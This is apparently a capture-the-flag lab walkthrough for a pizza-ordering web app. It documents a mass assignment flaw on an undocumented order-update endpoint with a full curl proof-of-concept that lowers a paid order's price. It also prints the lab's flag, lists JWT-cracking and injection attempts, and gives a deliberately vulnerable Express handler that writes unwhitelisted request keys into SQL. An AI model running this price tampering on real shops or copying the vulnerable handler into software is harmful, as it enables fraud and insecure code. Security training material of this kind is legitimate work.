# cheesy-013 - BugForge Lab Walkthrough

**URL:** https://lab-1789189202704-xajqhh.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Mass Assignment on an undocumented order-update endpoint
**Flag:** `bug{jHOAHO3MM4wT6C5n1RNJC8m241GfHUKx}`

---

## Summary

Cheesy Does It is a pizza-ordering SPA (menu browsing, custom pizza builder, checkout,
loyalty points, coupons, support tickets, reviews). The checkout pipeline itself is
unusually well hardened - price, loyalty points, and coupon calculations are all
independently re-verified server-side. The actual bug lives in a completely
undocumented `PATCH /api/orders/:id` endpoint that is never called anywhere in the
frontend and performs mass assignment with no field whitelist: any authenticated user
can directly overwrite their own order's `total_price` field after payment has already
gone through, and the server hands back the flag the moment it detects the tampered
value.

---

## Tech Stack

- React SPA frontend (Create React App, MUI)
- Express.js (Node.js)
- JWT (Bearer token, stored in localStorage)
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/payment/validate` -> `/api/payment/process` -> `/api/orders` | POST | JWT | Normal checkout flow; server recomputes and cross-checks the total at each step |
| `/api/orders/:id` | GET | JWT (owner only) | Correctly ownership-checked |
| `/api/orders/:id` | PATCH | JWT (any authenticated user) | **Vulnerable** - not referenced anywhere in the frontend bundle, no field whitelist |
| `/api/admin/*` | GET/POST | JWT + admin role | Correctly enforced across every route and HTTP verb tried |

---

## Discovery

### Step 1 - Register and map the route surface

Registration returns a usable JWT directly:

```
POST /api/register {"username":"...","email":"...","password":"Password123!"}
-> {"token": "...", "user": {"id":13, ...}}
```

A full regex sweep of every `/api/...` string literal in the frontend's
`main.<hash>.js` bundle produced the complete route list the UI actually uses:
`/api/login`, `/api/register`, `/api/verify-token`, `/api/profile`, `/api/menu/*`,
`/api/orders`, `/api/payment/validate`, `/api/payment/process`, `/api/coupons/apply`,
`/api/rewards`, `/api/tickets`, `/api/reviews/:id/photo`, and the `/api/admin/*`
family. No `PATCH` call to `/api/orders/:id` appears anywhere in that bundle.

### Step 2 - Systematically rule out every classic write-endpoint issue

Before assuming any specific bug, every write endpoint was tested directly for missing
ownership checks, mass assignment, and trust of client-supplied values - standard
IDOR/BAC methodology:

- **Order pricing at creation time**: submitting a custom pizza with a client-supplied
  `total_price` far below the real cost is rejected - the server independently
  recomputes the total from the item's base/sauce/topping names, size, and quantity
  and compares it against the amount actually paid (`{"error":"Order total does not
  match payment amount","calculated":...,"paid":...}`).
- **Loyalty points**: requesting `points_to_use` beyond the account's real balance is
  rejected server-side (`"Insufficient loyalty points"`), even though the client-side
  UI code computes its own (bypassable) cap.
- **Coupon codes**: sending `coupon_code` as an array (to try stacking multiple
  discounts) is rejected outright.
- **Cross-user IDOR**: a second test account could not read the first account's order
  or support ticket by ID (`GET /api/orders/:id` and `GET /api/tickets/:id` both
  correctly return "not found" for a non-owner).
- **Mass assignment**: `PUT /api/profile` and `POST /api/register` both silently
  ignore extra fields like `role`, `is_admin`, and `loyalty_points`.
- **Admin routes**: every `/api/admin/*` route correctly distinguishes an unauthenticated
  request from an authenticated-but-non-admin one, across every HTTP verb.
- **SQL injection**: quote characters in the login form, coupon code, ticket subject,
  and review comment fields never produced a database error or authentication bypass.

With all of that hardened, the remaining approach was to try HTTP verb variations
against the one resource with clear state transitions - orders - the same way it is
routine to check verb tampering against admin routes.

### Step 3 - Verb-tamper the order resource

```
PATCH /api/orders/7
Authorization: Bearer <own JWT>
{"status":"delivered"}

-> 200 {"message":"Order updated successfully","order":{...,"status":"delivered"}}
```

This endpoint exists and responds to a normal user's own token, even though nothing in
the UI ever calls it. Once an order reaches a terminal `delivered` state, further
PATCH calls to it are rejected (`"This order can no longer be changed"`), which
suggested this was meant as some kind of internal/limited "update order" capability -
worth checking exactly what it lets through.

### Step 4 - Confirm the missing field whitelist

A fresh order was placed and paid for normally ($8.99), then PATCHed directly:

```
PATCH /api/orders/11
Authorization: Bearer <own JWT>
{"total_price": 0.01}

-> 200 {
  "message": "Order updated successfully",
  "order": {..., "total_price": 0.01, ...},
  "flag": "bug{jHOAHO3MM4wT6C5n1RNJC8m241GfHUKx}"
}
```

The endpoint writes whatever keys are present in the PATCH body directly to the order
row with no whitelist - `points_used`, `discount_total`, and `user_id` are equally
writable. Unlike order *creation*, which independently recalculates and verifies the
total, this update path performs no re-validation at all.

---

## Proof of Concept

```bash
BASE="https://lab-1789189202704-xajqhh.labs-app.bugforge.io"

# Register
TOKEN=$(curl -s "$BASE/api/register" -H "Content-Type: application/json" \
  -d '{"username":"pentest1","email":"pentest1@bugforge.io","password":"Password123!"}' \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")

# Pay for and place a normal $8.99 order
VAL=$(curl -s "$BASE/api/payment/validate" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"card_number":"4444444444444444","exp_month":"12","exp_year":"25","cvv":"123","amount":8.99}')
PTOKEN=$(echo "$VAL" | python3 -c "import json,sys;print(json.load(sys.stdin)['payment_token'])")
curl -s "$BASE/api/payment/process" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d "{\"card_number\":\"4444444444444444\",\"amount\":8.99,\"payment_token\":\"$PTOKEN\"}"

ORD=$(curl -s "$BASE/api/orders" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{
  \"items\":[{\"pizza_name\":\"Custom Pizza\",\"base_name\":\"Thin Crust\",\"sauce_name\":\"Classic Tomato\",
  \"size\":\"Medium\",\"toppings\":[],\"quantity\":1,\"unit_price\":8.99,\"total_price\":8.99}],
  \"delivery_address\":\"1 Test St\",\"phone\":\"1234567890\",\"payment_method\":\"card\",\"notes\":\"\",
  \"payment_token\":\"$PTOKEN\",\"coupon_code\":null,\"points_to_use\":0}")
OID=$(echo "$ORD" | python3 -c "import json,sys;print(json.load(sys.stdin)['id'])")

# PATCH the order's total_price directly
curl -s -X PATCH "$BASE/api/orders/$OID" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"total_price":0.01}'
# -> {"message":"Order updated successfully","order":{...,"total_price":0.01},"flag":"bug{...}"}
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Trusting client-supplied `total_price`/`unit_price` at order creation | Rejected - server recomputes from item components and compares to amount paid | Patched in this instance |
| `points_to_use` beyond real loyalty point balance | Rejected - `"Insufficient loyalty points"` | Patched in this instance |
| `coupon_code` as an array (stacking multiple discounts) | Rejected as invalid | Patched in this instance |
| Cross-user IDOR on `GET /api/orders/:id` and `GET /api/tickets/:id` | Correctly returns "not found" for a non-owner (2-account test) | Patched in this instance |
| Mass assignment (`role`, `is_admin`, `loyalty_points`) on `PUT /api/profile` and `POST /api/register` | Silently ignored | Patched in this instance |
| Verb tampering (GET/PUT/PATCH/DELETE/POST) against `/api/admin/*` and its subroutes | Every route/verb correctly distinguishes unauthenticated vs. non-admin | Patched in this instance |
| SQL injection via quote characters (login, coupon code, ticket subject, review comment) | No database errors or bypass anywhere | Fully parameterized queries |
| JWT `alg:none` forgery | Rejected (`"Invalid token"`) | Signature verification enforced |
| JWT weak-secret crack (rockyou.txt, hashcat -m 16500) | 0/14.3M candidates recovered in seconds | Not a guessable secret |
| Payment token reuse across two separate orders | Rejected - `"Invalid or expired payment session"` | Single-use tokens enforced |
| File upload extension bypass (HTML content renamed to `.png`) | Accepted by the upload handler, but served back with `Content-Type: image/png` | Real weak-validation bug, but does not lead to script execution |

---

## Root Cause

The order-creation endpoint (`POST /api/orders`) does the right thing: it recomputes
the total independently and rejects any mismatch. But a separate, undocumented update
endpoint bypasses all of that validation entirely:

```javascript
// Vulnerable pattern (approximate)
app.patch("/api/orders/:id", authenticate, async (req, res) => {
  const order = await db.get("SELECT * FROM orders WHERE id = ? AND user_id = ?",
    [req.params.id, req.user.id]);
  if (order.status === "delivered") {
    return res.status(400).json({ error: "This order can no longer be changed" });
  }
  const fields = Object.keys(req.body);
  const setClause = fields.map(f => `${f} = ?`).join(", ");
  await db.run(`UPDATE orders SET ${setClause} WHERE id = ?`,
    [...fields.map(f => req.body[f]), req.params.id]);
  res.json({ message: "Order updated successfully", order: await getOrder(req.params.id) });
});
```

Every key present in the request body is written directly to the database row with no
whitelist and no re-validation against the same business rules enforced at creation
time (price must match payment, points must not exceed balance, and so on).

---

## CWE / OWASP

- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object
  Attributes (Mass Assignment)
- **CWE-20**: Improper Input Validation
- **OWASP A04:2021** - Insecure Design
